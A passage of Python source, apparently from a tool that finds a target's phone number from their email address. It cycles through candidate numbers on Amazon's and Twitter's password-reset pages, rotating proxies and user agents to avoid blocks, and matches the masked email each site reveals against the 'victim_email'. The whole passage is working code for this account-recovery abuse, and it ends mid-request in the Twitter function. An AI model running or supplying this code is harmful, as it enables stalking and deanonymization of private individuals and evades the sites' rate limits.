                logger.info("%sCaptcha caught us trying number: %s %s",
                            YELLOW, phone_number, ENDC)
            continue
        elif "Set a new password" in response.text:

            response = session.post(
                "https://www.amazon.com/ap/forgotpassword/options?ie=UTF8&openid.pape.max_auth_age=0"
                "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&paramJwt="
                + redirect_param_jwt
                + "&pageId=usflex&ignoreAuthState=1&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref"
                "3Dnav_custrec_signin&prevRID="
                + redirect_prev_rid
                + "&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net"
                "2Fextensions%2Fpape%2F1.0&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net"
                "2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0",
                headers={
                    "Cache-Control": "max-age=0",
                    "Origin": "https://www.amazon.com",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                data="prevRID=" + prevrid_search + "&workflowState=" +
                workflow_state + "&fppOptions=notSkip",
                proxies=proxy,
                verify=verifyProxy
            )
            if not re.search(regex_email, response.text):

                if verbose:
                    logger.info(
                        "%sNo masked email displayed for number: %s %s", YELLOW, phone_number, ENDC)
                continue
            masked_email = re.search(regex_email, response.text).group(0)
            if \
                    len(victim_email) == len(masked_email) \
                    and victim_email[0] == masked_email[0] \
                    and victim_email[victim_email.find('@')-1:] == masked_email[masked_email.find('@')-1:]:
                logger.info("%sPossible phone number for %s is: %s %s",
                            GREEN, victim_email, phone_number, ENDC)
                found_possible_number = True
            else:
                if verbose:
                    logger.info("%sNo match for email: %s and number: %s %s",
                                YELLOW, masked_email, phone_number, ENDC)
        elif "We've sent a code to the email" in response.text:

            masked_email = re.search(regex_email, response.text).group(0)
            if \
                    len(victim_email) == len(masked_email) \
                    and victim_email[0] == masked_email[0] \
                    and victim_email[victim_email.find('@')-1:] == masked_email[masked_email.find('@')-1:]:
                logger.info("%sPossible phone number for %s is: %s %s",
                            GREEN, victim_email, phone_number, ENDC)
                found_possible_number = True
            else:
                if verbose:
                    logger.info("%sNo match for email: %s and number: %s %s",
                                YELLOW, masked_email, phone_number, ENDC)
        else:
            logger.error("%sUnknown error: %s", RED, ENDC)
            if verbose:
                logger.error("%s%s %s", RED, response.text, ENDC)
            exit("Unknown error!")
    if not found_possible_number:
        logger.error(
            "%sCouldn't find a phone number associated to %s %s", RED, args.email, ENDC)


def get_masked_email_twitter(phone_numbers, victim_email, verbose):

    global userAgents
    global proxyList
    logger.info("Using Twitter to find victim's phone number...")
    found_possible_number = False
    regex_email = r"[a-zA-Z0-9]\**[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z0-9]+"

    for phone_number in phone_numbers:

        user_agent = random.choice(userAgents)
        proxy = random.choice(proxyList) if proxyList else None
        session = requests.Session()
        response = session.get(
            "https://twitter.com/account/begin_password_reset",
            headers={
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Push-State-Request": "true",
                "X-Requested-With": "XMLHttpRequest",
                "X-Twitter-Active-User": "yes",
                "User-Agent": user_agent,
                "X-Asset-Version": "5bced1",